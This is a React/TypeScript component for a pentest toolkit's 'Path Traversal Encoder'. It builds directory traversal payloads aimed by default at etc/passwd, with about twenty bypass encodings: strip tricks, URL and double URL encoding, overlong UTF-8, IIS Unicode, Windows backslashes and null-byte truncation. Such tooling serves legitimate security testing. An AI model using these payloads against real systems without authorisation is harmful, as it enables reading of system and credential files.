import { useState, useMemo } from 'react'
import { FolderOpen, Copy, Check } from '@phosphor-icons/react'
import { ToolLayout } from '../../components/ToolLayout'
import type { Tool } from '../types'

type Category = 'Pattern' | 'URL' | 'Unicode' | 'OS' | 'Null'

interface Bypass {
  id: string
  label: string
  category: Category
  description: string
  build: (depth: number, path: string) => string
}

const BYPASSES: Bypass[] = [
  // Pattern
  { id: 'raw',      label: '../',            category: 'Pattern', description: 'Raw traversal — baseline',                              build: (d, p) => '../'.repeat(d) + p },
  { id: 'strip1',   label: '....// (strip)', category: 'Pattern', description: 'Strip bypass: if "../" is stripped once, "..../" survives as "../"', build: (d, p) => '....//'.repeat(d) + p },
  { id: 'strip2',   label: '..././ (strip)', category: 'Pattern', description: 'Alt strip bypass — inserts extra dot between segments', build: (d, p) => '..././'.repeat(d) + p },
  // URL encoding
  { id: 'url-s',    label: '..%2f',          category: 'URL',     description: 'URL-encode slash',                                       build: (d, p) => '..%2f'.repeat(d) + p },
  { id: 'url-d',    label: '%2e%2e/',        category: 'URL',     description: 'URL-encode dots',                                        build: (d, p) => '%2e%2e/'.repeat(d) + p },
  { id: 'url-b',    label: '%2e%2e%2f',      category: 'URL',     description: 'URL-encode dots and slash',                              build: (d, p) => '%2e%2e%2f'.repeat(d) + p },
  { id: 'dbl-s',    label: '..%252f',        category: 'URL',     description: 'Double URL-encode slash (% → %25)',                      build: (d, p) => '..%252f'.repeat(d) + p },
  { id: 'dbl-b',    label: '%252e%252e%252f',category: 'URL',     description: 'Double URL-encode dots and slash',                       build: (d, p) => '%252e%252e%252f'.repeat(d) + p },
  // Unicode / overlong UTF-8
  { id: 'over-s',   label: '..%c0%af',       category: 'Unicode', description: 'Overlong UTF-8 / (0xC0 0xAF) — classic Apache/IIS bug',  build: (d, p) => '..%c0%af'.repeat(d) + p },
  { id: 'over-d',   label: '%c0%ae%c0%ae/',  category: 'Unicode', description: 'Overlong UTF-8 . (0xC0 0xAE)',                           build: (d, p) => '%c0%ae%c0%ae/'.repeat(d) + p },
  { id: 'over-db',  label: '%c0%ae%c0%ae%c0%af', category: 'Unicode', description: 'Overlong UTF-8 both dots and slash',                build: (d, p) => '%c0%ae%c0%ae%c0%af'.repeat(d) + p },
  { id: 'iis-u',    label: '..%u2215',       category: 'Unicode', description: 'IIS Unicode DIVISION SLASH U+2215',                      build: (d, p) => '..%u2215'.repeat(d) + p },
  { id: 'iis-s',    label: '..%u002f',       category: 'Unicode', description: 'IIS Unicode SOLIDUS U+002F',                             build: (d, p) => '..%u002f'.repeat(d) + p },
  // OS-specific
  { id: 'bs',       label: '..\\ (Win)',      category: 'OS',      description: 'Backslash — Windows path separator',                     build: (d, p) => '..\\'.repeat(d) + p },
  { id: 'bs-url',   label: '..%5c (Win)',     category: 'OS',      description: 'URL-encoded backslash',                                  build: (d, p) => '..%5c'.repeat(d) + p },
  { id: 'bs-dbl',   label: '..%255c (Win)',   category: 'OS',      description: 'Double URL-encoded backslash',                           build: (d, p) => '..%255c'.repeat(d) + p },
  { id: 'bs-iis',   label: '..%u005c (Win)',  category: 'OS',      description: 'IIS Unicode backslash U+005C',                           build: (d, p) => '..%u005c'.repeat(d) + p },
  // Null byte
  { id: 'null',     label: '%00',             category: 'Null',    description: 'Null byte — truncates string in C/PHP before extension check', build: (d, p) => '../'.repeat(d) + p + '%00' },
  { id: 'null-jpg', label: '%00.jpg',         category: 'Null',    description: 'Null byte + .jpg to satisfy extension whitelist',         build: (d, p) => '../'.repeat(d) + p + '%00.jpg' },
  { id: 'null-php', label: '%00.php',         category: 'Null',    description: 'Null byte + .php',                                        build: (d, p) => '../'.repeat(d) + p + '%00.php' },
  { id: 'null-txt', label: '%00.txt',         category: 'Null',    description: 'Null byte + .txt',                                        build: (d, p) => '../'.repeat(d) + p + '%00.txt' },
]

const CATEGORIES: Category[] = ['Pattern', 'URL', 'Unicode', 'OS', 'Null']

const CAT_ON: Record<Category, string> = {
  Pattern: 'border-vs-accent   text-vs-accent   bg-vs-accent/10',
  URL:     'border-blue-500    text-blue-400    bg-blue-500/10',
  Unicode: 'border-purple-400  text-purple-400  bg-purple-400/10',
  OS:      'border-yellow-500  text-yellow-500  bg-yellow-500/10',
  Null:    'border-red-500     text-red-400     bg-red-500/10',
}

const CAT_BADGE: Record<Category, string> = {
  Pattern: 'bg-vs-accent/20   text-vs-accent',
  URL:     'bg-blue-500/20    text-blue-400',
  Unicode: 'bg-purple-400/20  text-purple-400',
  OS:      'bg-yellow-500/20  text-yellow-500',
  Null:    'bg-red-500/20     text-red-400',
}

function CopyBtn({ value }: { value: string }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    navigator.clipboard.writeText(value)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }
  return (
    <button
      onClick={copy}
      title="Copy"
      className="shrink-0 p-1 rounded text-vs-muted hover:text-vs-text hover:bg-vs-active transition-colors"
    >
      {copied
        ? <Check size={13} weight="bold" className="text-green-400" />
        : <Copy size={13} />}
    </button>
  )
}

function PathTraversalEncoder() {
  const [path, setPath]         = useState('etc/passwd')
  const [depth, setDepth]       = useState(3)
  const [cats, setCats]         = useState<Set<Category>>(new Set(CATEGORIES))

  const toggleCat = (c: Category) =>
    setCats(prev => { const n = new Set(prev); if (n.has(c)) n.delete(c); else n.add(c); return n })

  const cleanPath = path.replace(/^\/+/, '')

  const rows = useMemo(
    () => BYPASSES
      .filter(b => cats.has(b.category))
      .map(b => ({ ...b, result: b.build(depth, cleanPath) })),
    [cats, depth, cleanPath]
  )

  return (
    <ToolLayout
      title="Path Traversal Encoder"
      description="Build traversal payloads with common WAF and filter bypass encodings"
    >
      <div className="flex flex-col gap-5 max-w-2xl">

        {/* Path + depth */}
        <div className="flex gap-3 items-end">
          <div className="flex flex-col gap-1.5 flex-1">
            <label className="text-vs-muted text-xs uppercase tracking-widest">Target path</label>
            <input
              type="text"
              value={path}
              onChange={e => setPath(e.target.value)}
              placeholder="etc/passwd"
              spellCheck={false}
              className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-sm font-mono px-3 py-2 rounded outline-none focus:border-vs-accent transition-colors"
            />
          </div>
          <div className="flex flex-col gap-1.5">
            <label className="text-vs-muted text-xs uppercase tracking-widest">Depth</label>
            <div className="flex items-stretch border border-vs-border rounded overflow-hidden">
              <button
                onClick={() => setDepth(d => Math.max(1, d - 1))}
                className="px-3 text-vs-muted hover:text-vs-text hover:bg-vs-hover transition-colors text-base leading-none"
              >−</button>
              <span className="px-3 py-2 text-vs-text text-sm font-mono bg-vs-sidebar min-w-[2.5rem] text-center border-x border-vs-border">{depth}</span>
              <button
                onClick={() => setDepth(d => Math.min(10, d + 1))}
                className="px-3 text-vs-muted hover:text-vs-text hover:bg-vs-hover transition-colors text-base leading-none"
              >+</button>
            </div>
          </div>
        </div>

        {/* Category toggles */}
        <div className="flex flex-col gap-1.5">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Bypass type</span>
          <div className="flex gap-2 flex-wrap">
            {CATEGORIES.map(cat => (
              <button
                key={cat}
                onClick={() => toggleCat(cat)}
                className={`px-3 py-1 text-xs rounded border transition-colors ${
                  cats.has(cat) ? CAT_ON[cat] : 'border-vs-border text-vs-muted hover:bg-vs-hover'
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        {/* Results */}
        {rows.length > 0 ? (
          <div className="flex flex-col gap-1.5">
            <div className="flex items-center justify-between">
              <span className="text-vs-muted text-xs uppercase tracking-widest">Payloads</span>
              <span className="text-vs-muted text-xs">{rows.length} variant{rows.length !== 1 ? 's' : ''}</span>
            </div>
            <div className="flex flex-col gap-1">
              {rows.map(b => (
                <div
                  key={b.id}
                  className="flex items-center gap-2 bg-vs-sidebar border border-vs-border rounded px-3 py-2 group hover:border-vs-accent/40 transition-colors"
                >
                  <span className={`shrink-0 text-[10px] font-mono px-1.5 py-0.5 rounded ${CAT_BADGE[b.category]}`}>
                    {b.category}
                  </span>
                  <span
                    title={b.description}
                    className="flex-1 text-vs-text text-xs font-mono break-all"
                  >
                    {b.result}
                  </span>
                  <CopyBtn value={b.result} />
                </div>
              ))}
            </div>
          </div>
        ) : (
          <p className="text-vs-muted text-xs text-center py-6 border border-dashed border-vs-border rounded">
            Toggle at least one bypass type above.
          </p>
        )}

      </div>
    </ToolLayout>
  )
}

export default {
  meta: {
    slug: 'path-traversal',
    name: 'Path Traversal',
    description: 'Build traversal payloads with WAF and filter bypass encodings',
    icon: FolderOpen,
    tags: ['web', 'pentest', 'bypass', 'encoding'],
  },
  Component: PathTraversalEncoder,
} satisfies Tool
